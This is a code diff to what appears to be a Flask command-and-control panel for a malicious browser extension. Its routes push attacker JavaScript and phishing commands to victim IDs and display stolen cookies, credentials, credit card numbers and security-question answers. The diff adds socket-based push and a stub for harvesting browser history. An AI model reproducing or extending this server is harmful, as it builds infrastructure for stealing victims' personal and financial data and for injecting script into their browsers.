@@ -1,16 +1,19 @@
 import eventlet
 eventlet.monkey_patch()
 from flask import Flask, render_template, request, redirect, url_for
-from .forms import LoginForm
+from forms import LoginForm
 from flask_login import logout_user, login_user, login_required, LoginManager, UserMixin
-from . import database, app
-from .app import app as app_flask
+import database, app
+from app import app as app_flask
+from flask_socketio import SocketIO, emit
 
 
 login_manager = LoginManager()
 login_manager.init_app(app_flask)
 login_manager.login_view = 'login'
 active_users = None
+
+socketio = SocketIO(app_flask, async_mode = 'eventlet')
 
 
 # user class not really sensible because only one attacker but necessary for implementing login
@@ -20,6 +23,7 @@ class User(UserMixin):
 
     def repr(self):
         return "admin"
+
 
 
 @login_manager.user_loader
@@ -67,11 +71,11 @@ def logout():
 
 @app_flask.route('/sendjs', methods=['POST'])
 def sendjs():
+    socketio.emit('connect', {'id':'9999'}, namespace="hi")
     a = request.form['js']
     b = request.form['id']
     c = a + '\n' + b
     #add_js_command(b, a)
-    # if active tell extension to send
     if (check_status(b)):
         return c
     else:
@@ -84,7 +88,6 @@ def phish():
     d = request.form['id']
     e = "Phish" + request.form['number']
     f = d + '\n' + e
-    # if active tell extension to send
     # add_phish_command(d, e)
     if (check_status(d)):
         return f
@@ -110,8 +113,14 @@ def getinfo():
         questions = cur.fetchall()
         conn.close()
 
+    head = ""
+    # browser_history = database.get_history(userid)
+    # with open(browser_history) as bh:
+    #     head = [next(bh) for x in range(10)]
+
+
     return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
-                           creditcards=creditcards, questions=questions)
+                           creditcards=creditcards, questions=questions, history = head)
 
 
 def update_payload(id, text):
@@ -128,4 +137,4 @@ def check_status(user):
 
 
 if __name__ == '__main__':
-    app_flask.run(debug=True)
+    socketio.run(app_flask, debug=True)
